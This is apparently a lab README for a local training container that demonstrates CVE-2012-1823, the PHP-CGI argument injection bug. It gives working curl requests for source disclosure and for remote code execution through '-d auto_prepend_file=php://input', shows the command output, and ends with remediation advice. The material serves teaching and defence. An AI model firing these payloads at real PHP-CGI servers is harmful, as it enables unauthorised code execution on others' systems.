# PHP-CGI Query String Argument Injection RCE (CVE-2012-1823)

## Overview

CVE-2012-1823 is an infamous remote code execution vulnerability in PHP running in CGI mode (`php-cgi`) affecting PHP versions prior to 5.3.12 and 5.4.2 (with similar argument injection patterns resurfacing in CVE-2024-4577).

According to RFC 3875 (CGI specification), query strings in HTTP requests that do not contain an unencoded equals sign (`=`) are split on whitespace and passed directly as command-line arguments to the CGI executable. When `php-cgi` receives command-line switches, an attacker can pass dangerous runtime flags directly via the URL:

- `-s`: Disclose the syntax-highlighted PHP source code of the targeted file.
- `-d`: Dynamically override PHP configuration directives (`ini_set`), such as enabling `allow_url_include=on` and `auto_prepend_file=php://input`.

By combining these flags, an unauthenticated attacker can read any PHP source code or execute arbitrary PHP commands supplied in the HTTP request body.

- **Primary Interface**: `http://localhost:8132`
- **Docker Shortcut**: `./lab start php-cgi-rce`
- **Container Name**: `cyberlab_02_php_cgi_rce`
- **RAM Footprint**: ~60 MB (Apache + PHP 5.4.1 CGI)

---

## Exploitation Walkthrough

### 1. Arbitrary Source Code Disclosure (`-s`)

Request the target PHP script with the `-s` query string:

```bash
curl -s 'http://localhost:8132/index.php?-s'
```

The server returns the full syntax-highlighted PHP source code of `index.php`.

### 2. Remote Code Execution via Configuration Override (`-d`)

Inject PHP configuration directives to evaluate the HTTP POST request body as PHP code:

```bash
curl -s -X POST 'http://localhost:8132/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input' \
  -d '<?php system("id; uname -a"); die(); ?>'
```

Output:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux cyberlab_02_php_cgi_rce ...
```

---

## Defensive Remediation & Hardening

1. **Upgrade PHP**:
   Upgrade to a supported version of PHP. Patched versions of `php-cgi` ignore command-line arguments when invoked in a CGI environment unless the `--` argument delimiter is present.
2. **Transition from CGI to PHP-FPM**:
   Do not deploy PHP in legacy CGI mode. Modern web architectures should use PHP-FPM (FastCGI Process Manager) behind Nginx or Apache with `mod_proxy_fcgi`.

---

## Video Walkthroughs & Technical References

- [The 'Ancient' Bug That Still Owns Modern Servers: CGI RCE Explained](https://www.youtube.com/watch?v=ncJOuqoMgFM)
- [PHP Security Advisory CVE-2012-1823](https://www.php.net/archive/2012.php#id2012-05-08-1)
- [Vulhub PHP-CGI CVE-2012-1823 Advisory](https://vulhub.org/#/environments/php/CVE-2012-1823/)
